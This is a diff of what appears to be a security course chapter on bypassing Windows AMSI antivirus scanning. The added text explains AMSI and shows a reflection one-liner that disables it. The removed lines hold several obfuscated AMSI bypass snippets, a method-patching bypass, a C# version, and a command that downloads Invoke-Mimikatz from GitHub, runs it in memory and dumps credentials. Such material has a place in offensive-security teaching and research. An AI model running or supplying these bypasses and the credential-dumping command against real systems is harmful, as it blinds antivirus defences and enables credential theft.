@@ -53,7 +53,7 @@ In its default configuration, macros are scanned at runtime via AMSI except in t
 >Runtime – Antimalware Scanning for All Assemblies
 >In previous versions of .NET Framework, Windows Defender or third-party antimalware software would automatically scan all assemblies loaded from disk for malware. However, assemblies loaded from elsewhere, such as by using Assembly.Load(byte[]), would not be scanned and could potentially carry viruses undetected.
 >
->.NET Framework 4.8 (released April 18th on Windows 10 triggers scans for those assemblies by Windows Defender and many other antimalware solutions that implement the Antimalware Scan Interface. We expect that this will make it harder for malware to disguise itself in .NET programs.
+>.NET Framework 4.8 (released April 18th on Windows 10) triggers scans for those assemblies by Windows Defender and many other antimalware solutions that implement the Antimalware Scan Interface. We expect that this will make it harder for malware to disguise itself in .NET programs.
 >
 >**LINK** : [https://devblogs.microsoft.com/dotnet/announcing-net-framework-4-8-early-access-build-3694/](https://devblogs.microsoft.com/dotnet/announcing-net-framework-4-8-early-access-build-3694/)
 >
@@ -63,8 +63,7 @@ In its default configuration, macros are scanned at runtime via AMSI except in t
 
 Supported OS
 ---
-- Windows 10 PRO/ENTERPRISE and Windows Server 2016
-- Windows Server 2019
+- Windows 10 PRO/ENTERPRISE and Windows Server 2016 and later
 
 Supported 3rd party Antivirus/EDR vendors
 ---
@@ -75,9 +74,9 @@ Supported 3rd party Antivirus/EDR vendors
 - McAfee Endpoint Security 10.6.0 
 - Sophos
 - Symantec (v14.3 and later)
+- and a lot more...
 
 **LINK** : [https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)
-
 
 To check which version of .net and the CLR is installed open a powershell prompt and type the following:
 
@@ -90,177 +89,106 @@ $dotnet.GetName().Version
 
 ![image](./images/dotnetversion.jpg)
 
+Let's see if our AMSI engine is working properly by doing a simple AMSI Test Sample (comparable to EICAR):
+
 AMSITEST
 ---
 
 ```yaml
-It '"Antimalware Scan Interface" is working' {
-    # AMSI test string 'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'
-    # (in the following as an obfuscated string)
-    # must throw an error if executed (blocked by AMSI)
-    $TestString = "FHJ+YHoTZ1ZARxNgUl5DX1YJEwRWBAFQAFBWHgsFAlEeBwAACh4LBAcDHgNSUAIHCwdQAgALBRQ="
-    $Bytes = [Convert]::FromBase64String($TestString)
-    $String = -join ($bytes | ForEach-Object { [char]($_ -bxor 0x33)})
-    { Invoke-Expression -Command $String } | Should Throw
-}
+Invoke-Expression 'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'
 ```
+![image](./images/amsitest.jpg)
 
-AMSIBYPASS
----
-
-> This bypass does not require administrator rights!!!
-
-Works on 1903, 1909 and before
+Even funnier, when you run the following command in a powershell console, AMSI will flag it as malicious, although the powershell script is not even available on your windows machine:
 
 ```yaml
-sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c, ' ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
+Invoke-Mimikatz
 ```
 
-List `dirty` words: 
+![image](./images/amsimimi.jpg)
 
-```yaml
-[ScriptBlock].GetField('signatures', 'NonPublic, Static').GetValue($null)
-```
+> **Bypassing AMSI and how it works**
 
-----
+As a first check, let's see in which process AMSI.dll has been loaded. Open a powershell prompt:
 
-https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell?tab=readme-ov-file#Patch-the-providers-DLL-of-Microsoft-MpOav.dll
-
-check which processes have amsi.dll loaded
-
+```powershell
 Get-Process | where {$_.modules.ModuleName -eq 'Amsi.dll'}
-
-
-Los er door:
-
-```powershell
-$w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils'
-$assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))
-$field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static')
-$field.SetValue($null,$true)
 ```
 
-https://medium.com/@sam.rothlisberger/amsi-bypass-memory-patch-technique-in-2024-f5560022752b
+![image](./images/ps_amsips.jpg)
 
+We can also use `SystemInformer` (previously known as `Process Hacker`) to verify, open `System Informer`, scroll down to your powershell process, right-click and select `properties`:
 
-And finally AMSI.FAIL
+![image](./images/ps_si_ps.jpg)
 
-or this also works
+Go to the `modules` tab, this will show all dll's loaded by the process, you will find the amsi.dll there indeed!
 
-```powershell
-class TrollAMSI{static [int] M([string]$c, [string]$s){return 1}}
-$o = [Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'ms'+'iU'+'ti'+'ls').GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq ScanContent
-$t = [TrollAMSI].GetMethods() | Where-Object Name -eq 'M'
-#[System.Runtime.CompilerServices.RuntimeHelpers]::PrepareMethod($t.MethodHandle)  
-#[System.Runtime.CompilerServices.RuntimeHelpers]::PrepareMethod($o.MethodHandle)
-[System.Runtime.InteropServices.Marshal]::Copy(@([System.Runtime.InteropServices.Marshal]::ReadIntPtr([long]$t.MethodHandle.Value + [long]8)),0, [long]$o.MethodHandle.Value + [long]8,1)
+![image](./images/ps_si_amsi.jpg)
+
+We're going to have a closer look at that AMSI.dll and see which functions it exports (more on functions later - just know that a windows program will load certain dll's from disk - these dll's contain common functions that Microsoft has made avaiable to make life a bit easier for developers :))
+
+**Pre-requisites**: dumpbin.exe /exports file.dll (requires visual studio c++ and msvc v142)
+
+![Screenshot](./images/msvc142.jpg)
+
+![Screenshot](./images/msvc_vs_dumpbin.jpg)
+
+Open the "Developer Command Prompt for Visual Studio 2019"
+
+![image](./images/ps_devprompt.jpg)
+
+If we have a look at the amsi.dll's exported functions using dumpbin we see the forllowing functions are avaiable:
+
+```bash
+dumpbin c:\windows\system32\amsi.dll /exports
 ```
 
-then run
+```bash
+ordinal hint RVA      name
 
-```powershell
-IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command privilege::debug; Invoke-Mimikatz -DumpCreds;
+          1    0 00003860 AmsiCloseSession
+          2    1 000034E0 AmsiInitialize
+          3    2 00003800 AmsiOpenSession
+ [+]      4    3 00003880 AmsiScanBuffer -> scans the content of buffers
+ [+]      5    4 00003980 AmsiScanString -> scans the content of strings (variables)
+          6    5 000039E0 AmsiUacInitialize
+          7    6 00003C60 AmsiUacScan
+          8    7 00003C00 AmsiUacUninitialize
+          9    8 000037A0 AmsiUninitialize
+         10    9 00001B00 DllCanUnloadNow
+         11    A 00001B40 DllGetClassObject
+         12    B 00001C80 DllRegisterServer
+         13    C 00001C80 DllUnregisterServer
 ```
 
-No detections, AMSI is disabled
+We can see here the AmsiScanBuffer and AmsiScanString functions we talked about earlier. So the question is, how to we bypass this functionality?
 
-## AMSI Bypass in .NET Binaries
+Luckily there are a ton of AMSI bypasses publicly available : (<https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell>)
 
-Yes, the AMSI bypass technique provided, which uses reflection to set the `amsiInitFailed` field to `$true`, will also work in .NET binaries, not just in PowerShell.
+In our next lab we'll be using "Matt Graebers Reflection method", it's a simple one-liner which uses reflection to set the `amsiInitFailed` field to `$true`, and will also work in .NET binaries, not just in PowerShell. Let's have a look how it works before we implement it.
 
-**Understanding the Technique:**
+![image](./images/amsi_gitbypasses.jpg)
 
-* **Reflection:** The core of this bypass relies on .NET reflection, which allows code to inspect and modify types, fields, and methods at runtime.
-* **Targeting `amsiInitFailed`:** The code specifically targets the `amsiInitFailed` static field within the `System.Management.Automation.AmsiUtils` class. This field is used to indicate whether the AntiMalware Scan Interface (AMSI) initialization has failed.
-* **Setting to `$true`:** By setting this field to `$true`, the code effectively tells the .NET runtime that AMSI initialization has failed, causing AMSI scans to be skipped.
+**"Matt Graebers Reflection method"**
+```powershell
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+```
 
-**How it Works in .NET Binaries:**
+### Understanding the Technique:
+
+**How it Works in `powershell`:**
+
+1. **Reflection:** The core of this bypass relies on .NET reflection, which allows code to inspect and modify types, fields, and methods at runtime.
+2. **Targeting `amsiInitFailed`:** The code specifically targets the `amsiInitFailed` static field within the `System.Management.Automation.AmsiUtils` class. This field is used to indicate whether the AntiMalware Scan Interface (AMSI) initialization has failed.
+3. **Setting to `$true`:** By setting this field to `$true`, the code effectively tells the .NET runtime that AMSI initialization has failed, causing AMSI scans to be skipped.
+
+**How it Works in `.NET Binaries`:**
 
 1.  **Locating `AmsiUtils`:** Just like in PowerShell, you can use reflection in C# (or other .NET languages) to locate the `System.Management.Automation.AmsiUtils` class.
 2.  **Accessing `amsiInitFailed`:** You can then use reflection to access the `amsiInitFailed` static field.
 3.  **Setting the Value:** Finally, you can use reflection to set the value of the `amsiInitFailed` field to `true`.
 
-**C# Example:**
+> **NOTE**: Modern `EDR` solutions are designed to detect such reflection-based attacks. They often monitor for suspicious memory modifications and code behavior. `EDR`'s will hook functions and rely heavily on telemtry such as `ETW providers` (***hint*** ***hint***), of course these can also be bypassed. For now we focus on AV bypassing. 
 
-```csharp
-using System;
-using System.Reflection;
+In the next chapter we will briefly go over ETW and then we'll apply our knowledge on how to bypass `AMSI` and `ETW` in our next lab!
 
-public class AmsiBypass
-{
-    public static void Main(string[] args)
-    {
-        try
-        {
-            // Get the AmsiUtils type
-            Type amsiUtilsType = typeof(System.Management.Automation.AmsiUtils);
-
-            // Get the amsiInitFailed field
-            FieldInfo amsiInitFailedField = amsiUtilsType.GetField("amsiInitFailed", BindingFlags.NonPublic | BindingFlags.Static);
-
-            // Set the amsiInitFailed field to true
-            if (amsiInitFailedField != null)
-            {
-                amsiInitFailedField.SetValue(null, true);
-                Console.WriteLine("AMSI bypassed.");
-            }
-            else
-            {
-                Console.WriteLine("amsiInitFailed field not found.");
-            }
-        }
-        catch (Exception ex)
-        {
-            Console.WriteLine($"Error: {ex.Message}");
-        }
-    }
-}
-```
-## Key Considerations:
-
-* **Assembly Loading:**
-    * If your .NET binary doesn't already have `System.Management.Automation.dll` loaded, you may need to load it explicitly using `Assembly.Load()` or related methods.
-* **.NET Version Compatibility:**
-    * Ensure that the reflection code is compatible with the .NET Framework or .NET Core/.NET 5+ version that the target binary is using.
-* **Security Implications:**
-    * AMSI bypass techniques can be used for malicious purposes. Use them responsibly and ethically.
-* **EDR Detection:**
-    * Modern EDR solutions are designed to detect such reflection-based attacks. They often monitor for suspicious memory modifications and code behavior.
-* **Finding the correct assembly:**
-    * In some .net applications, the `System.Management.Automation.dll` may not be loaded. If this is the case, you will need to load it.
-
-**In summary:** The AMSI bypass technique using reflection is not limited to PowerShell and can be successfully implemented in .NET binaries.
-
------
-# dotnet packing
-
-ConfuserEx
-Babel
-
-----
-https://github.com/pracsec/AmsiScanner/tree/main/src
-
-https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell?tab=readme-ov-file#Patching-Clr
-
-```powershell
-$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
-
-[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$mem)
-```
-
-Use this one:
-
-```powershell
-[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
-```
-
->Invoke-obfuscation
->set scriptblock [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
->token
->string
->2
-
-output =
-```powershell
-[Ref].Assembly.GetType(("{6}{4}{10}{3}{5}{7}{0}{11}{2}{1}{8}{9}"-f'.Auto','U','.Amsi','g','tem.','eme','Sys','nt','ti','ls','Mana','mation')).GetField(("{0}{1}{2}" -f 'amsi','InitFa','iled'),("{1}{0}{4}{2}{3}" -f'c','NonPubli','t','ic',',Sta')).SetValue($null,$true)
-```
